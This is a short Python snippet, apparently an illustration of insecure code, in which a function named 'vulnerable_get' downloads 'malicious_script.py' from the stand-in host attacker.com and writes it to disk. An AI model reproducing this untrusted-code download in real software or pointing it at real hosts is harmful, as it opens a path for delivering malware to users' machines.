import requests

def vulnerable_get(url):
    response = requests.get(url)
    return response.text

content = vulnerable_get("http://attacker.com/malicious_script.py")
with open("malicious_script.py", "w") as f:
    f.write(content)